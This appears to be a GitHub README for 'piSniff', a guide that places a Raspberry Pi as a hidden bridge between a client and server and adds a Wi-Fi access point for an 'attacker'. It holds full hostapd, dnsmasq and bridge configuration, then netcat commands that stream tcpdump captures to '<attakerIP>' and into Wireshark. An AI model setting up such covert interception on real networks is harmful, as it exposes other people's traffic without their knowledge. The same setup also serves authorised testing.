
<p align="center">
<img src="https://github.com/0x25/piSniff/blob/master/logo.PNG" alt="piSniff">
</p>

# piSniff [![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)
sniff packet with your Raspberry and access it with wifi

```
                     attaker
                     (((.)))
                      (( ))
                     (((.)))
                    [wifi:AP]
client ------ [eth0]raspberry[usb:eth1] ----- server
                     


INSTALL ACCESS POINT

hostap:wifi access point
dnsmaq:dns & dhcp server 

sudo apt-get -y install dnsmasq hostapd

sudo echo "denyinterfaces wlan0" >> /etc/dhcpcd.conf

sudo nano /etc/network/interfaces.d/wlan0
----------------
allow-hotplug wlan0  
iface wlan0 inet static  
    address 172.24.1.1
    netmask 255.255.255.0
    network 172.24.1.0
    broadcast 172.24.1.255
#    wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
----------------


sudo service dhcpcd restart

sudo ifdown wlan0; sudo ifup wlan0


CONFIGURE AP

sudo nano /etc/hostapd/hostapd.conf
-------------------
# This is the name of the WiFi interface we configured above
interface=wlan0

# Use the nl80211 driver with the brcmfmac driver
driver=nl80211

# This is the name of the network
ssid=Pi3-AP

# Use the 2.4GHz band
hw_mode=g

# Use channel 6
channel=6

# Enable 802.11n
ieee80211n=1

# Enable WMM
wmm_enabled=1

# Enable 40MHz channels with 20ns guard interval
ht_capab=[HT40][SHORT-GI-20][DSSS_CCK-40]

# Accept all MAC addresses
macaddr_acl=0

# Use WPA authentication
auth_algs=1

# Require clients to know the network name
ignore_broadcast_ssid=0

# Use WPA2
wpa=2

# Use a pre-shared key
wpa_key_mgmt=WPA-PSK

# The network passphrase
wpa_passphrase=raspberry

# Use AES, instead of TKIP
rsn_pairwise=CCMP
--------------------

sudo nano /etc/default/hostapd
-----------------
DAEMON_CONF="/etc/hostapd/hostapd.conf"
----------------

CONFIGURE DNSMASQ

sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
sudo nano /etc/dnsmasq.conf 
----------------------
interface=wlan0      # Use interface wlan0  
listen-address=172.24.1.1 # Explicitly specify the address to listen on  
bind-interfaces      # Bind to the interface to make sure we aren't sending things elsewhere  
#server=8.8.8.8       # Forward DNS requests to Google DNS  
domain-needed        # Don't forward short names  
bogus-priv           # Never forward addresses in the non-routed address spaces.  
dhcp-range=172.24.1.50,172.24.1.150,12h # Assign IP addresses between 172.24.1.50 and 172.24.1.150 with a 12 hour lease time  
----------------------

START

sudo service hostapd start  
sudo service dnsmasq start


CONFIGURE BRIDGE eth0 eth1


sudo apt-get -y install bridge-utils

sudo brctl addbr br0
sudo brctl addif br0 eth0 eth1

sudo nano /etc/network/interfaces.d/eth0
------------
iface eth0 inet manuel
------------

sudo nano /etc/network/interfaces.d/eth1
------------
iface eth1 inet manuel
------------

sudo nano /etc/network/interfaces.d/br0
------------
iface br0 inet manuel
bridge_ports eth0 eth1
------------


EXPORT PCAP TO HOST

on attaker
nc -l -p 9999 > capture.pcap

on raspberry 
tcpdump -s0 -U -n -w - -i br0 | nc <attakerIP> 9999

send tcpdump to wireshark attaker (on attacker)
nc -l -p 9999 | wireshark -k -S -i-

```

<p align="center">
<h1> View</h1>
<img src="https://github.com/0x25/piSniff/blob/master/Capture1.PNG" alt="rapsberry pisniff">
<h1> wireshark in the attacker remote PC
<img src="https://github.com/0x25/piSniff/blob/master/Capture3.PNG" alt="wireshark pisniff">
</p>

